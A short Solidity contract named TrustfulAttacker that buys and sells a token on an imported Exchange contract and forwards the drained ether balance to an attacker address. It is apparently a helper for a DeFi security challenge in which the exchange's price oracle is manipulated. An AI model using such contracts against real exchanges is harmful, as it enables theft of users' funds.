pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20Snapshot.sol";
import "./Exchange.sol";

contract TrustfulAttacker {
    using Address for address payable;
    uint256 private cachedId;
    Exchange private exchange;

    constructor(address payable exchAddr) public {
        cachedId = 0;
        exchange = Exchange(exchAddr);
    }

    function buy() public {
        cachedId = exchange.buyOne{value: 1}();
    }

    function sell() public {
        exchange.sellOne(cachedId);
    }

    function sendTo(address payable attacker) public {
        attacker.sendValue(address(this).balance);
    }

    receive() external payable {}
}